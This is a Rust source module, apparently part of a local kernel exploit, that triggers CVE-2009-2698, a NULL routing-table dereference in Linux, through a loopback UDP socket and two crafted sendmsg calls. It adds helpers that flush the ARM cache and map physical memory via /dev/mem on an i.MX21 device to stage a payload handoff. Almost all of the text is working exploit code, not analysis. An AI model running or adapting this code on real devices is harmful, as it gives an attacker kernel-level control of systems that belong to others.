//! CVE-2009-2698: the NULL `struct rtable` page-zero ELF route, and the
//! address-mapping helpers the handoff uses.
//!
//! The trigger is the same loopback UDP `socket` plus two `sendmsg` calls as
//! the earlier C implementation.  `MSG_PROBE|MSG_MORE` on the first makes
//! `ip_append_data()` dereference the NULL rtable; the second reaches
//! `rt->u.dst.output` at 0x74.

use crate::sys::{
    syscall3, syscall6, AF_INET, MAP_FIXED, MAP_SHARED, MSG_MORE, MSG_PROBE, PROT_READ, PROT_WRITE, SOCK_DGRAM,
    SYS_CACHEFLUSH, SYS_CLOSE, SYS_MMAP2, SYS_SENDMSG, SYS_SOCKET,
};

#[repr(C)]
struct SockaddrIn {
    family: u16,
    port: u16,
    addr: u32,
    zero: [u8; 8],
}

#[repr(C)]
struct Msghdr {
    name: *const u8,
    namelen: i32,
    iov: *const u8,
    iovlen: u32,
    control: *const u8,
    controllen: u32,
    flags: u32,
}

pub(crate) unsafe fn trigger() -> isize {
    let sin = SockaddrIn {
        family: AF_INET as u16,
        port: 0x1600,      // htons(22)
        addr: 0x0100_007f, // 127.0.0.1
        zero: [0; 8],
    };
    let msg = Msghdr {
        name: &sin as *const SockaddrIn as *const u8,
        namelen: core::mem::size_of::<SockaddrIn>() as i32,
        iov: core::ptr::null(),
        iovlen: 0,
        control: core::ptr::null(),
        controllen: 0,
        flags: 0,
    };
    let s = syscall3(SYS_SOCKET, AF_INET, SOCK_DGRAM, 0);
    if s < 0 {
        return s;
    }
    let r1 = syscall3(SYS_SENDMSG, s as usize, &msg as *const Msghdr as usize, MSG_MORE | MSG_PROBE);
    let r2 = syscall3(SYS_SENDMSG, s as usize, &msg as *const Msghdr as usize, 0);
    syscall3(SYS_CLOSE, s as usize, 0, 0);
    if r1 < 0 {
        r1
    } else {
        r2
    }
}

/// ARM private syscall 0x0f0002.  The handoff runs with the MMU off, so every
/// staged byte must reach physical memory.
pub(crate) unsafe fn cacheflush(start: u32, end: u32) -> isize {
    syscall3(SYS_CACHEFLUSH, start as usize, end as usize, 0)
}

/// `mmap2 /dev/mem` with `MAP_FIXED`.  The i.MX21 is above the 3 GiB
/// user/kernel split, so each physical page also needs a low user virtual
/// address.
pub(crate) unsafe fn map_phys(fd: usize, va: u32, pa: u32, len: u32) -> isize {
    syscall6(
        SYS_MMAP2,
        va as usize,
        len as usize,
        PROT_READ | PROT_WRITE,
        MAP_SHARED | MAP_FIXED,
        fd,
        (pa >> 12) as usize,
    )
}
